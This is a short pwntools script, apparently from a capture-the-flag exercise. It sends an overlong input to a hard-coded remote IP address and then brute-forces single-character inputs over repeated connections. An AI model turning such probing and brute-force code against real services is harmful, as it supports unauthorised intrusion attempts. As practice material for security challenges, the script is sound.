from pwn import *
import string

conn = remote('35.207.132.47', 1337)
conn.sendline('a' * 35)
print(conn.recv())

for ch in string.lowercase + string.digits:
    conn = remote('35.207.132.47', 1337)
    print('-----> ', ch)
    print(conn.recv())
    conn.sendline(ch)
    print(conn.recv())